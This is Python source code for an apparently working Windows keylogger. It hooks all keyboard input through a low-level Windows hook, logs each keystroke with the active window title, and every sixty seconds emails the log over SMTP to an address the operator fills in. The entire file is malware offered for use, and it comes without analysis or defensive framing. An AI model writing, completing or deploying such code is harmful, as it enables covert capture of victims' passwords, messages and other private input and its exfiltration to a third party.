from ctypes import *
from ctypes import wintypes
import time
import os
import threading
import smtplib
from email.message import EmailMessage

user32 = windll.user32
kernel32 = windll.kernel32

LRESULT = c_long
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
VK_LWIN = 0x5B
VK_RWIN = 0x5C

# Email Configuration
SMTP_SERVER = "<SMTP SERVER>"                        #Enter your smtp server .example smtp.gmail.com
SMTP_PORT = 587                                 
EMAIL_ADDRESS = "<EMAIL ADDRESSS>"                   # Enter your SMTP SERVER email address 
EMAIL_PASSWORD = "<Generated app password>"          # Enter your email address app password generated from gmail or other 
TO_EMAIL = "<keystrock receiving email addresss>"    # Enter your receiving email address this email address where keystrock are send.

GetForegroundWindow = user32.GetForegroundWindow
GetWindowTextLengthW = user32.GetWindowTextLengthW
GetWindowTextW = user32.GetWindowTextW
GetKeyState = user32.GetKeyState
GetKeyboardState = user32.GetKeyboardState
ToAscii = user32.ToAscii
CallNextHookEx = user32.CallNextHookEx
SetWindowsHookEx = user32.SetWindowsHookExW
GetMessageW = user32.GetMessageW
TranslateMessage = user32.TranslateMessage
DispatchMessageW = user32.DispatchMessageW

SetWindowsHookEx.argtypes = [wintypes.INT, wintypes.HANDLE, wintypes.HINSTANCE, wintypes.DWORD]
SetWindowsHookEx.restype = wintypes.HHOOK
CallNextHookEx.argtypes = [wintypes.HHOOK, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM]
CallNextHookEx.restype = LRESULT
GetMessageW.argtypes = [POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT]
GetMessageW.restype = wintypes.BOOL

if sizeof(c_void_p) == 8:
    ULONG_PTR = c_ulonglong
else:
    ULONG_PTR = c_ulong

class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ULONG_PTR),
    ]

keyboard_state = wintypes.BYTE * 256
HOOKPROC = WINFUNCTYPE(LRESULT, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

log_file_path = os.path.join(os.getcwd(), "keystroke_log.txt")
last_window = ""

with open(log_file_path, "w", encoding="utf-8") as f:
    f.write(f"[LOG START] {time.ctime()}\n")

def get_foreground_window_title():
    hwnd = GetForegroundWindow()
    if not hwnd:
        return ""
    length = GetWindowTextLengthW(hwnd)
    if length == 0:
        return ""
    buffer = create_unicode_buffer(length + 1)
    GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value

def log_to_file(text):
    with open(log_file_path, "a", encoding="utf-8") as f:
        f.write(text)

def send_email():
    try:
        with open(log_file_path, "r", encoding="utf-8") as f:
            content = f.read()

        if not content.strip():
            return

        msg = EmailMessage()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = "Keystroke Log File"
        msg.set_content("Attached is the latest keystroke log.")
        msg.add_attachment(content, filename="keystroke_log.txt")

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        # Clear the log after sending
        open(log_file_path, "w", encoding="utf-8").close()

    except Exception as e:
        print("[ERROR] Email sending failed:", e)

    finally:
        # Schedule next email in 60 seconds
        threading.Timer(60, send_email).start()

def hook_proc(nCode, wParam, lParam):
    global last_window
    if nCode == 0 and wParam == WM_KEYDOWN:
        kb = cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents
        current_window = get_foreground_window_title()

        if current_window != last_window:
            last_window = current_window
            entry = f"\n\n[RUN] {current_window} [{time.ctime()}]\n"
            print(entry, end="")
            log_to_file(entry)

        if kb.vkCode in (VK_LWIN, VK_RWIN):
            print("[WINDOWS KEY]", end="", flush=True)
            log_to_file("[WINDOWS KEY]")
        else:
            state = keyboard_state()
            if GetKeyboardState(byref(state)):
                ascii_buf = (wintypes.WORD * 2)()
                if ToAscii(kb.vkCode, kb.scanCode, byref(state), ascii_buf, 0) == 1:
                    char = chr(ascii_buf[0] & 0xFF)
                    print(char, end="", flush=True)
                    log_to_file(char)

    return CallNextHookEx(None, nCode, wParam, lParam)

# Install the hook
hook_ptr = HOOKPROC(hook_proc)
hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_ptr, None, 0)

if not hook:
    print("Failed to install hook.")
    exit(1)

print(f"[+] Keylogger started. Saving to {log_file_path}")

# Start periodic email sending
send_email()

msg = wintypes.MSG()
while GetMessageW(byref(msg), None, 0, 0) != 0:
    TranslateMessage(byref(msg))
    DispatchMessageW(byref(msg))
